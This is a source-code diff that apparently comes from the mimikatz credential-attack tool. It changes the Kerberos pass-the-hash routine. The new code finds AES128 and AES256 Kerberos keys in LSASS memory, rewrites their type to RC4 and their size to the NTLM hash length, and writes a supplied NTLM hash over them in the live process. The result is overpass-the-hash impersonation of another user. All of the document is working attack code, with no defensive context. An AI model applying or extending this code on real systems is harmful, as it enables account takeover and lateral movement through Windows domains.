@@ -223,8 +223,10 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 	DWORD i, nbHash;
 	BYTE ntlmHash[LM_NTLM_HASH_LENGTH];
 	UNICODE_STRING nullPasswd = {0, 0, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {ntlmHash, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password), RemoteLocalKerbSession.hMemory};
+	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {NULL, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password), RemoteLocalKerbSession.hMemory};
 	PKERB_HASHPASSWORD_GENERIC pHash;
+	PBYTE baseCheck;
+	SIZE_T offset;
 
 	if(RemoteLocalKerbSession.address =  *(PVOID *) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetKeyList))
 	{
@@ -234,7 +236,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 			{
 				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
 				{
-					RemoteLocalKerbSession.address = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
+					RemoteLocalKerbSession.address = baseCheck = (PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].structKeyListSize;
 					i = nbHash * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
 					if(aLocalHashMemory.address = LocalAlloc(LPTR, i))
 					{
@@ -244,15 +246,32 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 							for(i = 0, pthData->isReplaceOk = TRUE; (i < nbHash) && pthData->isReplaceOk; i++)
 							{
 								kprintf(L" ");
-								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric);
+								offset = i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric;
+								pHash = (PKERB_HASHPASSWORD_GENERIC) ((PBYTE) aLocalHashMemory.address + offset);
+								
+								if((pHash->Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) || (pHash->Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96))
+								{
+									kprintf(L"-");
+									pHash->Type = KERB_ETYPE_RC4_HMAC_NT;
+									pHash->Size = LM_NTLM_HASH_LENGTH;
+									
+									aLocalNTLMMemory.address = pHash;
+									RemoteLocalKerbSession.address = baseCheck + offset;
+									if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, FIELD_OFFSET(KERB_HASHPASSWORD_GENERIC, Checksump)))
+										kprintf(L">");
+									else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+								}
+								
+								aLocalNTLMMemory.address = ntlmHash;
 								RemoteLocalKerbSession.address = pHash->Checksump;
 								RtlCopyMemory(aLocalNTLMMemory.address, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
 								if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)
 									(*pData->lsassLocalHelper->pLsaProtectMemory)(aLocalNTLMMemory.address, LM_NTLM_HASH_LENGTH);
-								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, pHash->Size ? (min(pHash->Size, LM_NTLM_HASH_LENGTH)) : LM_NTLM_HASH_LENGTH)) // ok not fair-play with AES-* and old CRC =)
+								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, min(pHash->Size, LM_NTLM_HASH_LENGTH))) // ok not fair-play with AES-* and old CRC =)
 									kprintf(L"%u", i+1);
 								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
 							}
+
 							if(pthData->isReplaceOk && ((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) Localkerbsession.address + kerbHelper[KerbOffsetIndex].offsetCreds))->Password.Buffer)
 							{
 								kprintf(L" ");
